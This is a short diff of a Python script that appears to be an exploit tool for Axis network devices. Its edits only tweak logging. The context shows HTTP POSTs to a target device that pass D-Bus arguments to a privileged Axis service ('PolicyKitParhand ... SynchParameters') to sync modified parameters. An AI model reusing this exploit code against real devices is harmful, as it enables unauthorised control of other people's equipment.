@@ -143,7 +143,6 @@ def test_connect():
     logging(f"+ Testing connection to device...\t\t\t\t")
     
     if http_check(requests.post(f"{target_url}", data=TEST_DATA, proxies=req_proxy, allow_redirects=False), True):
-        logging("Quitting")
         exit(1)
 
 # Sync modifications
@@ -153,7 +152,7 @@ def sync_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SynchParameters",
     }
     
-    logging(f"Syncing parameters...\t\t\t\t\t\t")
+    logging(f"Syncing parameters...\t\t\t\t\t")
     
     if http_check(requests.post(f"{target_url}", data=SYNC_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
